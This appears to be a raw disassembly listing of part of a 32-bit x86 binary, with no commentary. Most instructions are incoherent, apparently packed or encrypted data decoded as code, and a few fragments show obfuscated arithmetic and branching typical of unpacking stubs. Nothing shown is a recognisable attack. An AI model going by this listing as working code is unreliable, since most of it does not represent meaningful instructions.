  4020df:	pop    ebx
  4020e0:	adc    BYTE PTR [edi-0x1618fb83],dl
  4020e6:	test   BYTE PTR [eax+ebx*2],ah
  4020e9:	add    eax,0x10a013a5
  4020ee:	xchg   ebp,eax
  4020ef:	jp     0x402108
  4020f1:	stos   DWORD PTR es:[edi],eax
  4020f2:	pop    ecx
  4020f3:	hlt    
  4020f4:	fidivr WORD PTR [ebx]
  4020f6:	adc    BYTE PTR [ebx-0x7ebd0d02],bh
  4020fc:	(bad)  
  4020fe:	int3   
  4020ff:	jp     0x4020e8
  402101:	imul   ecx,DWORD PTR [bx+si-0x6a],0x16
  402106:	fwait
  402107:	iret   
  402108:	mov    ch,0x38
  40210b:	lock inc ebx
  40210d:	sub    al,0x5b
  40210f:	imul   edi,DWORD PTR [ebx],0x7792a1c0
  402115:	and    eax,0xf74aa9f4
  40211a:	add    eax,0xb4bad2e
  40211f:	fdivr  QWORD PTR [edi-0x2]
  402122:	add    dl,BYTE PTR [eax]
  402124:	mov    edi,0x53afa846
  402129:	adc    DWORD PTR [ecx],esp
  40212b:	pop    ebx
  40212c:	adc    al,0x50
  40212e:	call   0xb91f2c37
  402133:	mov    al,ds:0x53f9ab77
  402138:	(bad)  
  40213a:	mov    dh,0xc8
  40213c:	jbe    0x4020cf
  40213e:	stos   DWORD PTR es:[edi],eax
  40213f:	xor    bl,BYTE PTR [eax]
  402141:	xchg   esi,eax
  402142:	cmp    esp,DWORD PTR [ebx-0x7ba80729]
  402148:	push   0xffffffed
  40214a:	jnp    0x4021ca
  40214c:	and    BYTE PTR [ecx-0x50d9591d],0x91
  402153:	dec    edi
  402154:	fstp   TBYTE PTR [eax]
  402156:	shr    BYTE PTR [esi-0x58],0x7a
  40215a:	mov    cl,0x5
  40215c:	push   edx
  40215d:	push   0x5cbea20
  402162:	xor    al,0xc2
  402164:	nop
  402165:	retf   
  402166:	les    ebx,FWORD PTR [ebx]
  402168:	out    dx,al
  402169:	mov    esi,fs
  40216b:	scas   eax,DWORD PTR es:[edi]
  40216c:	aad    0x5c
  40216e:	adc    esi,0xcff5d182
  402174:	push   0x2870a119
  402179:	mov    edi,0x682fcb4c
  40217e:	mov    BYTE PTR [edx+0x3d],bl
  402181:	dec    ebx
  402182:	stos   BYTE PTR es:[edi],al
  402183:	je     0x402149
  402185:	mov    WORD PTR [edi+eiz*2-0x20],es
  402189:	push   0x37
  40218b:	sub    eax,0xb4f53628
  402190:	imul   ebp,DWORD PTR ds:0xd12c7b37,0x54
  402197:	fsub   QWORD PTR [edi]
  402199:	sub    edx,DWORD PTR [ebp+0x644640c3]
  40219f:	outs   dx,DWORD PTR ds:[esi]
  4021a0:	jns    0x4021a7
  4021a2:	ja     0x402176
  4021a4:	sbb    ebx,DWORD PTR [eax-0x5b]
  4021a7:	push   ss
  4021a8:	out    dx,al
  4021a9:	stc    
  4021aa:	outs   dx,BYTE PTR ds:[esi]
  4021ab:	xchg   esp,eax
  4021ac:	or     eax,0xe9c963c9
  4021b1:	addr16 push cs
  4021b3:	in     al,0x65
  4021b5:	in     al,dx
  4021b6:	lods   eax,DWORD PTR ds:[esi]
  4021b7:	add    DWORD PTR [eax+0x6f],esi
  4021ba:	mov    ah,0xe8
  4021bc:	mov    ebx,0xdbf2f2eb
  4021c1:	ret    
  4021c2:	cmp    DWORD PTR [ebp+0x67],esi
  4021c5:	jb     0x4021d4
  4021c7:	cmp    ch,dh
  4021c9:	xchg   edx,eax
  4021ca:	in     eax,0x95
  4021cc:	sub    ebx,DWORD PTR [ebp-0x4d]
  4021cf:	div    DWORD PTR [edx+0x10ba147f]
  4021d5:	mov    esi,0x6798ac81
  4021da:	(bad)  
  4021db:	cmp    ecx,DWORD PTR ds:0xb09b3173
  4021e1:	sub    eax,DWORD PTR [ecx+0x122992f5]
  4021e7:	scas   eax,DWORD PTR es:[edi]
  4021e8:	std    
  4021e9:	xchg   ecx,eax
  4021ea:	repnz pop ss
  4021ec:	xor    al,0x84
  4021ee:	scas   eax,DWORD PTR es:[edi]
  4021ef:	out    dx,al
  4021f0:	mov    ebx,0xffb4408a
  4021f5:	lahf   
  4021f6:	mov    ds:0xa18667e1,eax
  4021fb:	or     al,BYTE PTR [ecx-0x60]
  4021fe:	imul   edx,DWORD PTR [edx],0x75831d17
  402204:	jb     0x4021a6
  402206:	enter  0x2206,0xdb
  40220a:	jmp    0xbc3c9ef4
  40220f:	mov    al,ds:0xde588778
  402214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402215:	(bad)  
  402216:	sub    BYTE PTR [edx+0x36],0x11
  40221a:	mov    DWORD PTR ds:0xd2c02c8e,0xe1e26132
  402224:	jae    0x402291
  402226:	xor    esi,DWORD PTR [edx]
  402228:	mov    esi,ebx
  40222a:	xchg   edi,eax
  40222b:	sbb    BYTE PTR [ebx-0x5e],0xad
  40222f:	push   0xffffff84
  402231:	mov    DWORD PTR [esi],eax
  402233:	mov    eax,ds:0x30d4283
  402238:	push   ss
  402239:	mov    WORD PTR [edi],ds
  40223b:	call   0x45719a13
  402240:	xchg   edx,eax
  402241:	test   al,0x87
  402243:	call   0x1e06:0xee1f868
  40224a:	scas   eax,DWORD PTR es:[edi]
  40224b:	pop    ss
  40224c:	call   0xfd651eff
  402251:	adc    eax,0xcbf999b1
  402256:	inc    edx
  402257:	int3   
  402258:	cmp    ecx,DWORD PTR [ecx-0x23]
  40225b:	fcmovu st,st(1)
  40225d:	mov    dh,0x7e
  40225f:	sub    al,0xba
  402261:	mov    eax,0xc7e11fb
  402266:	xchg   ebp,eax
  402267:	out    dx,eax
  402268:	ror    ebp,1
  40226a:	inc    esi
  40226b:	pop    esi
  40226c:	mov    bh,0x66
  40226e:	lds    edi,FWORD PTR ss:[ebx+esi*4]
  402272:	mov    bl,BYTE PTR [eax-0x7bf01409]
  402278:	add    DWORD PTR [eax+eax*1],0xec458b00
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    ebx,edx
  40229b:	dec    edx
  40229c:	rcl    BYTE PTR [eax+0x70],0x2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	aaa    
  4022a7:	cmp    al,0x8c
  4022a9:	dec    ecx
  4022aa:	dec    edi
  4022ab:	cmp    eax,0xd2b2b607
  4022b0:	lea    eax,[edi+edx*1]
  4022b3:	std    
  4022b4:	mov    dh,0xd8
  4022b6:	xchg   ebp,eax
  4022b7:	in     al,dx
  4022b8:	xchg   DWORD PTR [esi-0x63],esp
  4022bb:	sub    BYTE PTR [ebx-0x5f],dh
  4022be:	xlat   BYTE PTR ds:[ebx]
  4022bf:	mov    ?,WORD PTR [edi+eax*2+0x72]
  4022c3:	cs or  eax,0xe7673417
  4022c9:	popf   
  4022ca:	pop    ebx
  4022cb:	shl    ebp,cl
  4022cd:	mov    ebp,0x2355acc0
  4022d2:	xchg   BYTE PTR [esp+ebx*2],ah
  4022d5:	xchg   esi,eax
  4022d6:	fcom   st(0)
  4022d8:	mov    dh,BYTE PTR [edx]
  4022da:	(bad)  
  4022db:	xchg   ebx,eax
  4022dc:	(bad)  
  4022dd:	(bad)
  4022e0:	lock xchg ebp,eax
  4022e2:	jae    0x4022d0
  4022e4:	push   0x22
  4022e6:	aas    
  4022e7:	jb     0x4022db
  4022e9:	xchg   ebp,eax
  4022ea:	les    eax,FWORD PTR [edx]
  4022ec:	mov    edx,0x653f4061
  4022f1:	mov    DWORD PTR [ebx+0x7cbb5ab1],ebp
  4022f7:	mov    esp,0x5d00b075
  4022fc:	push   ss
  4022fd:	into   
  4022fe:	icebp  
  4022ff:	clc    
  402300:	push   eax
  402301:	jmp    0x6407:0x54d9b4f9
  402308:	or     eax,0x3f98e169
  40230d:	sbb    ebx,edx
  40230f:	sub    eax,0xc86d9d0
  402314:	call   0x781200dd
  402319:	out    dx,eax
  40231a:	in     al,dx
  40231b:	and    eax,0xa11ac62e
  402320:	sbb    ebx,DWORD PTR [ecx-0xc]
  402323:	repz in ax,dx
  402326:	or     ebp,DWORD PTR [ecx-0x29]
  402329:	test   DWORD PTR [ebx+0x75d95c60],0xf5f2d1db
  402333:	mov    eax,ds:0x41fd21ae
  402338:	mov    DWORD PTR ds:0xb29b74c6,esi
  40233e:	sbb    al,0xba
  402340:	in     al,0x4d
  402342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402343:	pop    ebx
  402344:	fsubr  DWORD PTR [edi]
  402346:	add    al,0xb1
  402348:	enter  0x529c,0xd9
  40234c:	pop    ecx
  40234d:	sbb    DWORD PTR [edx],ebp
  40234f:	outs   dx,DWORD PTR ds:[esi]
  402350:	out    0xcc,eax
  402352:	jo     0x4023cd
  402354:	test   al,0x1
  402356:	xor    ah,bl
  402358:	cmp    eax,0xe19f389a
  40235d:	or     BYTE PTR [ecx-0x4f],cl
  402360:	loop   0x40231d
  402362:	dec    eax
  402363:	mov    eax,0xfca4211d
  402368:	pop    ebp
  402369:	test   BYTE PTR [esi+0x2f1cadec],al
  40236f:	pop    edx
  402370:	jnp    0x402366
  402372:	pop    eax
  402373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402374:	sub    bl,bl
  402376:	and    al,0x57
  402378:	add    edi,0x87a9cd4
  40237e:	je     0x4023f6
  402380:	mov    ds:0x58135a8a,al
  402385:	imul   esi
  402387:	add    ecx,DWORD PTR [esi+0xf]
  40238a:	fiadd  WORD PTR [ebx+esi*1-0x1e]
  40238e:	fwait
  40238f:	jns    0x402362
  402391:	aas    
  402392:	out    dx,eax
  402393:	xchg   ecx,eax
  402394:	pop    ebx
  402395:	adc    BYTE PTR [ebp+0x54afa161],0x40
  40239c:	ins    BYTE PTR es:[edi],dx
  40239d:	pop    ebx
  40239e:	(bad)  
  40239f:	cmp    DWORD PTR [ebx-0x78],esi
  4023a2:	lock mov bl,0x2e
  4023a5:	mov    eax,0xcad34ee7
  4023aa:	mov    DWORD PTR [eax-0x59],0x78056485
  4023b1:	dec    eax
  4023b2:	inc    ecx
  4023b3:	jbe    0x402385
  4023b5:	pop    edi
  4023b6:	inc    edx
  4023b7:	jbe    0x4023f0
  4023b9:	inc    esp
  4023ba:	mov    ebp,DWORD PTR [edx]
  4023bc:	xchg   BYTE PTR [ecx-0x58],dh
  4023bf:	lea    esi,[edi+0x2e80db3a]
  4023c5:	and    bl,BYTE PTR [edx-0x5]
  4023c8:	add    al,0xa4
  4023ca:	pop    edi
  4023cb:	aas    
  4023cc:	fisttp QWORD PTR [ecx+eax*2+0x6f]
  4023d0:	lods   eax,DWORD PTR ds:[esi]
  4023d1:	(bad)  
  4023d2:	int3   
  4023d3:	adc    eax,0xcd57b265
  4023d8:	fcomp  QWORD PTR [bp+di-0x3f41]
  4023dd:	and    cl,dl
  4023df:	ins    DWORD PTR es:[edi],dx
  4023e0:	hlt    
  4023e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e2:	or     DWORD PTR [edi+0x30],edx
  4023e5:	jno    0x402463
  4023e7:	arpl   sp,di
  4023e9:	imul   esi,eax,0xea14b027
  4023ef:	fisub  WORD PTR [ebx+0x44740fc4]
  4023f5:	and    ah,bh
  4023f7:	push   ecx
  4023f8:	push   cs
  4023f9:	push   ebx
  4023fa:	fmulp  st(2),st
  4023fc:	push   eax
  4023fd:	and    cl,BYTE PTR [edx+0x23]
  402400:	int3   
  402401:	lahf   
  402402:	dec    esi
  402403:	sahf   
  402404:	es jg  0x40239b
  402407:	fs pop ds
  402409:	pop    esi
  40240a:	mov    WORD PTR [esi],?
  40240c:	imul   ebx,DWORD PTR [edi+0x6fab8708],0x2f
  402413:	adc    dh,bl
  402415:	mov    esi,0x7dd4c7e9
  40241a:	repnz jecxz 0x40240b
  40241d:	leave  
  40241e:	(bad)  
  40241f:	cli    
  402420:	push   esi
  402421:	ss std 
  402423:	mov    ch,0x7e
  402425:	or     cl,BYTE PTR [ecx+0x1d]
  402428:	(bad)  
  402429:	test   eax,0xedcc808f
  40242e:	(bad)  
  40242f:	sbb    al,0x13
  402431:	retf   
  402432:	and    dh,0xb9
  402435:	scas   al,BYTE PTR es:[edi]
  402436:	mov    ecx,0xb4025d96
  40243b:	push   cs
  40243c:	cld    
  40243d:	and    eax,0xc8535ff1
  402442:	push   edi
  402443:	data16 add cl,BYTE PTR [esi]
  402446:	dec    ebx
  402447:	push   esi
  402448:	inc    edi
  402449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40244a:	dec    ebx
  40244b:	retf   
  40244c:	push   esi
  40244d:	(bad)  
  40244e:	aam    0x51
  402450:	dec    esi
  402451:	push   ds
  402452:	and    cl,dh
  402454:	stos   DWORD PTR es:[edi],eax
  402455:	and    DWORD PTR [edi+0x2],esi
  402458:	sub    DWORD PTR [eax-0x72],ebx
  40245b:	mov    edi,es
  40245d:	leave  
  40245e:	mov    edi,0x31c315c7
  402463:	or     BYTE PTR [ebx-0x517c8d9d],ah
  402469:	mov    ah,BYTE PTR [esi+0xe384e04]
  40246f:	or     cl,BYTE PTR [eax]
  402471:	outs   dx,BYTE PTR ds:[esi]
  402472:	push   esi
  402473:	jge    0x4024e1
  402475:	fstp   TBYTE PTR gs:[edi+eiz*4]
  402479:	pushf  
  40247a:	jecxz  0x4024ef
  40247c:	imul   esp,esi,0xb67debf8
  402482:	dec    ebp
  402483:	dec    edi
  402484:	mov    dh,0xe9
  402486:	sbb    al,0xbb
  402488:	xor    DWORD PTR [ecx-0x62],edx
  40248b:	dec    ebp
  40248c:	lock and DWORD PTR [edx*8+0x7a57b4e8],eax
  402494:	mov    ecx,0xf9b7bc1
  402499:	lods   eax,DWORD PTR ds:[esi]
  40249a:	jle    0x4024d2
  40249c:	stos   BYTE PTR es:[edi],al
  40249d:	xor    eax,0x419334ad
  4024a2:	das    
  4024a3:	push   0xffffffff
  4024a5:	fisub  DWORD PTR [esi-0x75]
  4024a8:	push   ebp
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x167eaa37],cl
  4024f4:	mov    eax,ds:0x70700070
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	mov    ebp,0xfdcb442c
  402502:	xor    al,0x35
  402504:	shr    DWORD PTR [edi-0x18576f7b],cl
  40250a:	sub    al,0xf4
  40250c:	sub    al,0x8a
  40250e:	sub    DWORD PTR [ecx+0x7d],ebx
  402511:	int    0x49
  402513:	xor    eax,0x4017f008
  402518:	fimul  DWORD PTR [edx]
  40251a:	outs   dx,BYTE PTR ds:[esi]
  40251b:	je     0x402574
  40251d:	je     0x4024d0
  40251f:	(bad)  
  402520:	fucomi st,st(6)
  402522:	cli    
  402523:	ins    DWORD PTR es:[edi],dx
  402524:	mov    ?,WORD PTR [ebx-0x594f8c0e]
  40252a:	int3   
  40252b:	jl     0x402574
  40252d:	mov    cl,0x7d
  40252f:	jmp    0xdcae024a
  402534:	lock push eax
  402536:	dec    ebp
  402537:	cdq    
  402538:	retf   
  402539:	aaa    
  40253a:	xchg   esi,eax
  40253b:	(bad)  
  40253c:	sbb    eax,0xab1ac1
  402541:	add    al,0x2e
  402543:	and    edi,DWORD PTR [esi+0x3c]
  402546:	sbb    eax,0xbaf7f222
  40254b:	xchg   DWORD PTR [esi],ebx
  40254d:	rcl    DWORD PTR [eax],0x98
  402550:	fs scas al,BYTE PTR es:[edi]
  402552:	aas    
  402553:	push   edx
  402554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402555:	xchg   edx,eax
  402556:	test   al,0xdb
  402558:	mov    edx,0xdcc3aef6
  40255d:	mov    dl,0x8f
  40255f:	mov    al,ds:0x5102f480
  402564:	aad    0xcb
  402566:	out    dx,al
  402567:	mov    BYTE PTR [edx],bl
  402569:	imul   ecx,DWORD PTR [ebx+0x570dc27],0x56befca5
  402573:	sub    esp,esp
  402575:	mov    ds:0x5372f980,eax
  40257a:	out    0x42,eax
  40257c:	sub    BYTE PTR [edi],0x67
  40257f:	mov    al,0x52
  402581:	pop    ecx
  402582:	and    DWORD PTR [ebx],esi
  402584:	or     ax,0x8e01
  402588:	ret    0x3a60
  40258b:	test   cl,al
  40258d:	xchg   ecx,eax
  40258e:	add    DWORD PTR ds:0x5c782e58,esp
  402594:	mov    al,ds:0xc9209fce
  402599:	fist   WORD PTR [ecx]
  40259b:	les    eax,FWORD PTR [eax-0x749e6f8b]
  4025a1:	cmp    eax,0xa4691d9f
  4025a6:	rcr    edi,1
  4025a8:	fbstp  TBYTE PTR [ebx+0x5af13028]
  4025ae:	mov    ds:0x1cfcd90d,eax
  4025b3:	out    dx,eax
  4025b4:	mov    edi,0x3b5169a5
  4025b9:	je     0x4025e4
  4025bb:	cmp    edx,DWORD PTR [eax+ebp*1-0x7b]
  4025bf:	fdiv   QWORD PTR [ebx+0x4957a22a]
  4025c5:	xchg   ebp,eax
  4025c6:	pop    edi
  4025c7:	add    DWORD PTR [esi],ebp
  4025c9:	ja     0x402598
  4025cb:	js     0x4025f9
  4025cd:	inc    edi
  4025ce:	push   esi
  4025cf:	xchg   edi,eax
  4025d0:	stos   DWORD PTR es:[edi],eax
  4025d1:	retf   
  4025d2:	pop    DWORD PTR [edi+0x67]
  4025d5:	jnp    0x402618
  4025d7:	jl     0x402574
  4025d9:	inc    esi
  4025da:	sub    eax,0x14510615
  4025df:	pop    ss
  4025e0:	stos   BYTE PTR es:[edi],al
  4025e1:	cmp    eax,0x66b33bdc
  4025e6:	cmp    edx,DWORD PTR [esi]
  4025e8:	arpl   WORD PTR [ecx-0x4beadf80],dx
  4025ee:	push   esp
  4025ef:	push   edi
  4025f0:	push   edx
  4025f1:	mov    ebp,0xe3592f17
  4025f6:	jae    0x40263a
  4025f8:	mov    cl,0x4
  4025fa:	or     esi,esi
  4025fc:	ins    BYTE PTR es:[edi],dx
  4025fd:	out    dx,eax
  4025fe:	or     BYTE PTR [edi-0x79e11c15],ch
  402604:	add    BYTE PTR [ebx-0x65],0xe9
  402608:	cwde   
  402609:	fs dec esp
  40260b:	nop
  40260c:	xchg   esp,eax
  40260d:	test   BYTE PTR [edi],0x97
  402610:	push   es
  402611:	loopne 0x402593
  402613:	push   esi
  402614:	das    
  402615:	sti    
  402616:	fsubr  QWORD PTR [esi]
  402618:	imul   ebx,DWORD PTR ds:0xca6bf88a,0xbabd2e07
  402622:	fwait
  402623:	pop    edx
  402624:	rcr    ecx,0x46
  402627:	jecxz  0x4025d1
  402629:	ret    0x46a7
  40262c:	or     BYTE PTR [edx],ch
  40262e:	push   ds
  40262f:	scas   eax,DWORD PTR es:[edi]
  402630:	push   es
  402631:	sbb    BYTE PTR [ebx-0x78],bh
  402634:	je     0x402611
  402636:	mov    bh,0x20
  402638:	jecxz  0x40267d
  40263a:	mov    ch,0x0
  40263c:	stos   DWORD PTR es:[edi],eax
  40263d:	loop   0x402606
  40263f:	mov    esp,0x54c0c27f
  402644:	dec    esp
  402645:	leave  
  402646:	xchg   esp,eax
  402647:	loopne 0x40269c
  402649:	retf   
  40264a:	rcr    ebp,0x1f
  40264d:	shl    ch,1
  40264f:	push   edi
  402650:	sub    eax,edi
  402652:	adc    dl,ah
  402654:	iret   
  402655:	lods   eax,DWORD PTR ds:[esi]
  402656:	dec    eax
  402657:	leave  
  402658:	xchg   edi,eax
  402659:	sbb    BYTE PTR [eax+0x52b4ebf0],0xf3
  402660:	sbb    DWORD PTR [edi],eax
  402662:	sub    eax,0x16eb3f69
  402667:	or     esp,DWORD PTR [ebp-0x4a6d5af5]
  40266d:	out    0x97,eax
  40266f:	and    bh,al
  402671:	(bad)  
  402672:	and    al,0x1b
  402674:	(bad)  
  402675:	cmp    bl,BYTE PTR [ebx-0x74]
  402678:	aaa    
  402679:	test   al,0xfc
  40267b:	ins    DWORD PTR es:[edi],dx
  40267c:	cwde   
  40267d:	jge    0x402669
  40267f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402680:	cli    
  402681:	push   ds
  402682:	inc    edi
  402683:	cmp    al,0x68
  402685:	div    ch
  402687:	retf   
  402688:	repz test eax,0x4ce52a04
  40268e:	outs   dx,DWORD PTR ds:[esi]
  40268f:	xchg   edi,eax
  402690:	jb     0x402652
  402692:	in     al,0xcc
  402694:	dec    edx
  402695:	cmp    ch,cl
  402697:	fistp  WORD PTR [ecx+eax*2-0x6d]
  40269b:	dec    edi
  40269c:	xchg   edx,eax
  40269d:	aas    
  40269e:	cmp    al,0xa3
  4026a0:	cwde   
  4026a1:	adc    eax,DWORD PTR [esi]
  4026a3:	inc    esp
  4026a4:	lods   eax,DWORD PTR ds:[esi]
  4026a5:	xor    BYTE PTR [ecx-0x3],bh
  4026a8:	into   
  4026a9:	mov    dh,0xeb
  4026ab:	enter  0x9b20,0x58
  4026af:	jg     0x402694
  4026b1:	sub    DWORD PTR [ecx],edi
  4026b3:	sbb    eax,0x9043b8d4
  4026b8:	cmp    dl,bl
  4026ba:	(bad)
  4026bd:	xchg   BYTE PTR [ecx+ecx*8+0x452bb335],dh
  4026c4:	call   0xed31920f
  4026c9:	(bad)  
  4026ca:	adc    eax,0x71218bd0
  4026cf:	dec    ecx
  4026d0:	cmp    ah,BYTE PTR [esi+0x13]
  4026d3:	lods   al,BYTE PTR ds:[esi]
  4026d4:	mov    eax,0x2b9383f5
  4026d9:	into   
  4026da:	and    ebp,DWORD PTR [eax]
  4026dc:	popa   
  4026dd:	pop    ss
  4026de:	mov    esp,0xbba77a29
  4026e3:	mov    ds:0x7beeedd7,al
  4026e8:	jmp    0x7711:0x5debe928
  4026ef:	shr    DWORD PTR [esi-0xe245030],1
  4026f5:	pop    edi
  4026f6:	pop    edi
  4026f7:	hlt    
  4026f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026f9:	int3   
  4026fa:	pop    edi
  4026fb:	xor    eax,0xf4458bc2
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x39dfaee5
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	inc    edx
  402768:	dec    esi
  402769:	adc    ebx,DWORD PTR [eax+0x3e86719c]
  40276f:	jo     0x4027a9
  402771:	data16 sub BYTE PTR [edx-0x5a],dl
  402775:	jl     0x40270d
  402777:	ror    BYTE PTR [edx-0x2312e81d],0x68
  40277e:	and    al,0x1d
  402780:	inc    ebx
  402781:	mov    DWORD PTR [ecx+0xac65c24],edx
  402787:	sbb    esp,DWORD PTR [esi-0x77ee84c7]
  40278d:	mov    al,0x25
  40278f:	mov    ebp,0x704e951f
  402794:	mov    edi,0x44a9e5e1
  402799:	jmp    0xa5ac:0xa8204ada
  4027a0:	pop    es
  4027a1:	mov    esi,0xdd8fef67
  4027a6:	fmulp  st(3),st
  4027a8:	lock stos BYTE PTR es:[edi],al
  4027aa:	mov    fs,WORD PTR [edx]
  4027ac:	or     bh,al
  4027ae:	mov    fs,ebx
  4027b0:	sbb    DWORD PTR [eax-0x6a],esi
  4027b3:	pop    ecx
  4027b4:	mov    bh,0x1c
  4027b6:	bound  eax,QWORD PTR [esi-0xe]
  4027b9:	adc    dh,BYTE PTR [edi]
  4027bb:	push   ds
  4027bc:	nop
  4027bd:	inc    ebx
  4027be:	into   
  4027bf:	stos   DWORD PTR es:[edi],eax
  4027c0:	(bad)  
  4027c1:	dec    edi
  4027c2:	and    al,0x4b
  4027c4:	dec    ebp
  4027c5:	jno    0x40275f
  4027c7:	jle    0x40275a
  4027c9:	test   DWORD PTR [edi+0x21265789],0xcec1735d
  4027d3:	cmp    ah,BYTE PTR [eax-0x50fa182a]
  4027d9:	daa    
  4027da:	stos   DWORD PTR es:[edi],eax
  4027db:	xchg   edi,eax
  4027dc:	loope  0x402849
  4027de:	sub    BYTE PTR [edx+0x1dd3180a],cl
  4027e4:	lock xor al,0xac
  4027e7:	rdtsc  
  4027e9:	mov    ebp,0xa71c5514
  4027ee:	test   DWORD PTR [edx-0x33],0x5c8486f5
  4027f5:	mov    al,0xc8
  4027f7:	popf   
  4027f8:	arpl   WORD PTR [ecx+0x4b],di
  4027fb:	retf   0x56b8
  4027fe:	int    0xa4
  402800:	jo     0x4027a8
  402802:	mov    edx,0xca8ac98f
  402807:	xchg   edx,eax
  402808:	outs   dx,DWORD PTR ds:[esi]
  402809:	pop    ss
  40280a:	aas    
  40280b:	push   edx
  40280d:	push   esp
  40280e:	call   0x797b:0xe5be156b
  402815:	mov    cl,0x1f
  402817:	mov    al,ds:0xb61f7232
  40281c:	cmp    ebx,DWORD PTR [esi+0x2ada0b52]
  402822:	rcl    DWORD PTR [edx-0xd],1
  402825:	test   edx,esp
  402827:	mov    al,0xb6
  402829:	fdivp  st(0),st
  40282b:	out    0x55,al
  40282d:	test   BYTE PTR [edi-0x2c],al
  402830:	jb     0x40284c
  402832:	push   ds
  402833:	cmp    BYTE PTR [edx-0x5cf84721],ah
  402839:	dec    ebx
  40283a:	push   edx
  40283b:	sbb    ch,BYTE PTR [edi+ebp*8]
  40283e:	dec    eax
  40283f:	push   eax
  402840:	push   es
  402841:	ror    bl,1
  402843:	xchg   ebp,eax
  402844:	push   edx
  402845:	and    al,0x23
  402847:	xchg   ebp,eax
  402848:	dec    ebx
  402849:	push   0xa8832bdb
  40284e:	clc    
  40284f:	jl     0x402802
  402851:	mov    gs,WORD PTR [eax+0x22f40c2f]
  402857:	in     eax,0xb6
  402859:	mov    DWORD PTR [ebp+0x7a],0x7aac5bc7
  402860:	jle    0x4028b2
  402862:	mov    esi,0x78e7ba18
  402867:	les    ecx,FWORD PTR [eax-0x30969072]
  40286d:	cwde   
  40286e:	test   eax,0xdd6d13af
  402873:	scas   al,BYTE PTR es:[edi]
  402874:	pop    edi
  402875:	push   ss
  402876:	leave  
  402877:	pop    ecx
  402878:	aad    0x2e
  40287a:	ror    DWORD PTR [esi],0x4f
  40287d:	add    BYTE PTR [ebp-0x25589f61],dh
  402883:	sbb    esp,esi
  402885:	dec    edx
  402886:	inc    eax
  402887:	aam    0xed
  402889:	jle    0x4028f4
  40288b:	(bad)  
  40288c:	and    DWORD PTR [edi+0x584dc122],esi
  402892:	cmp    eax,0x909bdf85
  402897:	or     bl,ah
  402899:	or     BYTE PTR [ebx],cl
  40289b:	into   
  40289c:	xor    ecx,DWORD PTR [edx+ebp*2+0x727b66ca]
  4028a3:	mov    esp,0x71a43f02
  4028a8:	jecxz  0x40284a
  4028aa:	cli    
  4028ab:	adc    esp,DWORD PTR [ecx-0x2957479e]
  4028b1:	pop    ebp
  4028b2:	jne    0x40285b
  4028b4:	(bad)  
  4028b5:	sbb    BYTE PTR [ebx],dh
  4028b7:	rol    BYTE PTR [ebx],1
  4028b9:	dec    edx
  4028ba:	mov    esi,0x9cd62fbf
  4028bf:	retf   0xc01b
  4028c2:	push   ebx
  4028c3:	hlt    
  4028c4:	test   DWORD PTR [ebx+eax*2+0x2f66225d],ebp
  4028cb:	(bad)  
  4028cc:	rcl    BYTE PTR [edx-0x43],1
  4028cf:	sbb    eax,0x3a54e710
  4028d4:	test   BYTE PTR [eax-0x42],bl
  4028d7:	call   DWORD PTR [eax+0x458bd859]
  4028dd:	cli    
  4028de:	cmc    
  4028df:	(bad)  
  4028e0:	push   eax
  4028e1:	pop    eax
  4028e2:	adc    dl,dh
  4028e4:	bound  ebx,QWORD PTR [esi-0x23b2fe85]
  4028ea:	outs   dx,BYTE PTR ds:[esi]
  4028eb:	adc    eax,0x809cfdf4
  4028f0:	mov    eax,0xcd83276c
  4028f5:	(bad)  
  4028f6:	lods   eax,DWORD PTR ds:[esi]
  4028f7:	lea    edx,[ebx]
